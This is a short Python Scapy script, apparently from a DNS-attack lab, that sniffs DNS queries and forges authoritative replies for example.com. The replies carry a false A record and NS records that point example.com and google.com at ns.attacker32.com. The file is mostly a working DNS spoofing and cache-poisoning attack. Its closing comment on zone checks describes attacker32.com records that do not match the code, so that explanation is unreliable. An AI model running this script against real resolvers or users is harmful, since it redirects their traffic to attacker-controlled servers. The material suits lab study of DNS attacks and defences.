#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
  if (DNS in pkt and 'example.com' in pkt[DNS].qd.qname.decode('utf-8')):

    # Swap the source and destination IP address
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

    # Swap the source and destination port number
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    # The Answer Section
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='10.0.2.5')

    # The Authority Section
    NSsec1 = DNSRR(rrname='example.com', type='NS',
                   ttl=259200, rdata='ns.attacker32.com')
    NSsec2 = DNSRR(rrname='google.com', type='NS',
                   ttl=259200, rdata='ns.attacker32.com')

    # The Additional Section
    Addsec1 = DNSRR(rrname='ns.attacker32.com', type='A',
                    ttl=259200, rdata='10.9.0.153')

    # Construct the DNS packet
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=2, arcount=1,
                 an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1)

    # Construct the entire IP packet and send it out
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and dst port 53'
pkt = sniff(iface='br-c86d56e79837', filter=f, prn=spoof_dns)      

'''
In this example, the attacker places 2 NS records in the authority section,
one for the attacker32.com domain, and the other for the google.com domain.
Both records indicate that ns.attacker32.com is their authoritative nameserver.
The first record is legitimate and will be chached, but the second record is fradulent
and should be discarded. The criterion is based on zones. The query is sent to the attacker32.com
zone, so the DNS resovler will use attacker32.com to decide whether the data in the authority section
is inside this zone or outside. The first record is right inside the zone, so should be accepted.
However, the second record is google.com, which is not inside the zone of attacker32.com, so it will be discarded.
'''